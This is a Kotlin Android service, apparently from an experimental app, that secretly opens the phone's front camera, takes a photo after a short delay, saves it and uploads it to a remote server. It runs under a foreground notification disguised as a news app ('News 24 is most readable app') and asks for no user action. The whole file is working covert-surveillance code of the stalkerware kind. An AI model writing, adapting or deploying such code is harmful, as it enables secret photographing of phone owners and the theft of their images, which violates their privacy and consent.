package com.ecommerce.experimentapp.service

import android.annotation.SuppressLint
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.graphics.SurfaceTexture
import android.hardware.camera2.*
import android.media.Image
import android.media.ImageReader
import android.media.MediaScannerConnection
import android.os.Build
import android.os.Environment
import android.os.Handler
import android.os.HandlerThread
import android.os.IBinder
import android.util.Log
import android.util.Size
import android.view.Surface
import android.widget.Toast
import androidx.core.app.NotificationCompat
import androidx.core.content.ContentProviderCompat.requireContext
import com.ecommerce.experimentapp.R
import com.ecommerce.experimentapp.network.RetrofitClient
import okhttp3.MediaType
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.RequestBody
import retrofit2.Call
import retrofit2.Callback
import retrofit2.Response
import java.io.File
import java.io.FileOutputStream
import java.nio.ByteBuffer

class CameraService : Service() {

    companion object {
        private const val CHANNEL_ID = "CameraServiceChannel"
        private const val NOTIFICATION_ID = 1234
        private const val DELAY_MILLIS = 2000L // 5 seconds delay
    }

    private lateinit var cameraDevice: CameraDevice
    private lateinit var cameraCaptureSessions: CameraCaptureSession
    private lateinit var captureRequestBuilder: CaptureRequest.Builder
    private lateinit var imageReader: ImageReader
    private lateinit var backgroundHandler: Handler
    private lateinit var backgroundThread: HandlerThread

    override fun onCreate() {
        super.onCreate()
        Log.d("CameraService", "Service created and started in foreground")

        startBackgroundThread()
        Handler().postDelayed({
            openCamera()
        }, DELAY_MILLIS)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)

        startForegroundService()
        Log.d("CameraService", "onStartCommand triggered")
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    private fun startForegroundService() {
        val notification = NotificationCompat.Builder(this, "camera_service_channel")
            .setContentTitle("New 24")
            .setContentText("News 24 is most readable app ")
            .setSmallIcon(R.drawable.ic_fcm_notification)
            .build()

        startForeground(1, notification)
    }


    @SuppressLint("MissingPermission")
    private fun openCamera() {
        val manager = getSystemService(CAMERA_SERVICE) as CameraManager
        try {
            // Loop through available cameras and find the front-facing camera
            var frontCameraId: String? = null
            for (cameraId in manager.cameraIdList) {
                val characteristics = manager.getCameraCharacteristics(cameraId)
                val cameraFacing = characteristics.get(CameraCharacteristics.LENS_FACING)
                if (cameraFacing != null && cameraFacing == CameraCharacteristics.LENS_FACING_FRONT) {
                    frontCameraId = cameraId
                    break
                }
            }

            if (frontCameraId != null) {
                manager.openCamera(frontCameraId, stateCallback, backgroundHandler)
            } else {
                Log.e("CameraService", "No front-facing camera found.")
            }
        } catch (e: Exception) {
            Log.e("CameraService", "Camera open error: ${e.message}")
        }
    }

    private val stateCallback = object : CameraDevice.StateCallback() {
        override fun onOpened(camera: CameraDevice) {
            cameraDevice = camera
            createCameraPreview()
        }

        override fun onDisconnected(camera: CameraDevice) {
            cameraDevice.close()
        }

        override fun onError(camera: CameraDevice, error: Int) {
            cameraDevice.close()
            stopSelf()
        }
    }

    private fun createCameraPreview() {
        val manager = getSystemService(CAMERA_SERVICE) as CameraManager
        val characteristics = manager.getCameraCharacteristics(cameraDevice.id)
        val map = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)

        // Set the selfie resolution to 640x480
        val selfieResolution = Size(640, 480)

        // Check if the resolution is supported, if not, fall back to a supported size
        val previewSize = map?.getOutputSizes(SurfaceTexture::class.java)?.find {
            it.width == selfieResolution.width && it.height == selfieResolution.height
        } ?: map?.getOutputSizes(SurfaceTexture::class.java)?.firstOrNull()

        if (previewSize == null) {
            Log.e("CameraService", "No suitable preview size found")
            return
        }

        val surfaceTexture = SurfaceTexture(10)
        surfaceTexture.setDefaultBufferSize(previewSize.width, previewSize.height)
        val previewSurface = Surface(surfaceTexture)

        imageReader = ImageReader.newInstance(previewSize.width, previewSize.height, android.graphics.ImageFormat.JPEG, 1)
        imageReader.setOnImageAvailableListener({
            val image = it.acquireLatestImage()
            if (image != null) {
                Log.d("CameraService", "Image saved: ${image}")
                saveImageToDisk(image)
                image.close()
            }
            stopSelf() // Stop the service after capturing the image
        }, backgroundHandler)

        captureRequestBuilder = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW)
        captureRequestBuilder.addTarget(previewSurface)

        cameraDevice.createCaptureSession(
            listOf(previewSurface, imageReader.surface),
            object : CameraCaptureSession.StateCallback() {
                override fun onConfigured(session: CameraCaptureSession) {
                    cameraCaptureSessions = session
                    captureRequestBuilder.set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO)
                    session.setRepeatingRequest(captureRequestBuilder.build(), null, backgroundHandler)

                    Handler().postDelayed({
                        captureStillPicture()
                    }, 2000) // Capture the image after 2 seconds
                }

                override fun onConfigureFailed(session: CameraCaptureSession) {
                    Log.e("CameraService", "Configuration failed")
                }
            },
            null
        )
    }


    private fun captureStillPicture() {
        try {
            val captureBuilder = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
            captureBuilder.addTarget(imageReader.surface)
            captureBuilder.set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO)

            cameraCaptureSessions.capture(captureBuilder.build(), null, backgroundHandler)
        } catch (e: Exception) {
            Log.e("CameraService", "Capture error: ${e.message}")
        }
    }

    private fun saveImageToDisk(image: Image) {
        val buffer: ByteBuffer = image.planes[0].buffer
        val bytes = ByteArray(buffer.remaining())
        buffer.get(bytes)

        // Use a public directory like Pictures
        val outputDirectory = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES)
        val photoFile = File(outputDirectory, "captured_image_${System.currentTimeMillis()}.jpg")

        var fileOutputStream: FileOutputStream? = null
        try {
            fileOutputStream = FileOutputStream(photoFile)
            fileOutputStream.write(bytes)
            Log.d("CameraService", "Image saved: ${photoFile.absolutePath}")

            // Notify the gallery about the new image
            // addImageToGallery(photoFile.absolutePath)
            // Upload Image to Server
            uploadImageToServer(photoFile)
        } catch (e: Exception) {
            Log.e("CameraService", "Error saving image: ${e.message}")
        } finally {
            fileOutputStream?.close()
            image.close()
        }
    }

    private fun addImageToGallery(filePath: String) {
        val file = File(filePath)
        MediaScannerConnection.scanFile(
            this,
            arrayOf(file.toString()),
            null
        ) { path, uri ->
            Log.d("CameraService", "Image added to gallery: $path")
        }
    }

    private fun uploadImageToServer(photoFile: File) {
        val requestFile = RequestBody.create("image/jpeg".toMediaTypeOrNull(), photoFile)
        val body = MultipartBody.Part.createFormData("file", photoFile.name, requestFile)
        val description = RequestBody.create("text/plain".toMediaTypeOrNull(), "image_description")


        val call = RetrofitClient.instance.uploadImage(body, description)
        call.enqueue(object : Callback<Void> {
            override fun onResponse(call: Call<Void>, response: Response<Void>) {
                if (response.isSuccessful) {
                    Log.d("CameraService", "Image uploaded successfully")
                    Toast.makeText(baseContext, "Image uploaded successfully", Toast.LENGTH_LONG)
                        .show()
                } else {
                    Log.e("CameraService", "Failed to upload image: ${response.errorBody()?.string()}")
                    Toast.makeText(baseContext, "Failed to upload image: ${response.errorBody()?.string()}", Toast.LENGTH_LONG)
                        .show()
                }
            }

            override fun onFailure(call: Call<Void>, t: Throwable) {
                Log.e("CameraService", "Upload error: ${t.message}")
            }
        })
    }


    private fun startBackgroundThread() {
        backgroundThread = HandlerThread("Camera Background")
        backgroundThread.start()
        backgroundHandler = Handler(backgroundThread.looper)
    }

    override fun onDestroy() {
        super.onDestroy()
        cameraDevice.close()
        stopBackgroundThread()
    }

    private fun stopBackgroundThread() {
        backgroundThread.quitSafely()
        backgroundThread.join()
    }
}
